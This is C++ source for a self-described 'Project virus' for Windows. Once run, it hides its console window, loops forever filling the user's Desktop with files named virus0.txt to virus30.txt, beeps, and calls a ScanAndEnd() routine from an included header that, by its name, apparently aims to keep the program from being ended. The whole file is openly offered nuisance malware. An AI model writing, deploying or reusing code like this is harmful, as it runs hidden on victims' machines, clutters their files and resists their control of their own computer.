//////////////////////////////////
// Project virus by Minh Dat    //
// Don't copyright              //
// 2022 - 2023                  //
//////////////////////////////////

#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <stdio.h>
#include <urlmon.h>
#include "AntiEndProgram.h"

#pragma comment(lib, "user32.lib")
#pragma comment (lib, "urlmon.lib")

using namespace std;

#define INFO_BUFFER_SIZE 32767

TCHAR infoBuf[INFO_BUFFER_SIZE];

void LaytenUser()
{
	DWORD bufCharCount = INFO_BUFFER_SIZE;
	GetUserName(infoBuf, &bufCharCount);
}

void chay_ngam(int visibility) // Ẩn console
{
	HWND window; //defines a handle to a window
	window = FindWindowA("ConsoleWindowClass", NULL); //returns the handle of the current window
	ShowWindow(window, visibility); //if visibility=0, then it runs in the background. If not, then the window shows.
}

void AmThanh() 
{
	char sound = 7;
	cout << sound;
}

int main()
{
	LaytenUser(); // Lấy tên User
	wstring test(&infoBuf[0]); //convert to wstring
	string user(test.begin(), test.end());

	while (1) 
	{
		chay_ngam(0); // Ẩn console
		
		for (int i = 0; i <= 30; i++)
		{
			ofstream taofile("C://Users//" + user + "//Desktop//virus" + to_string(i) + ".txt");
		}

		ScanAndEnd();

		AmThanh();

		Sleep(600);
	}

	getchar();

	return 0;
}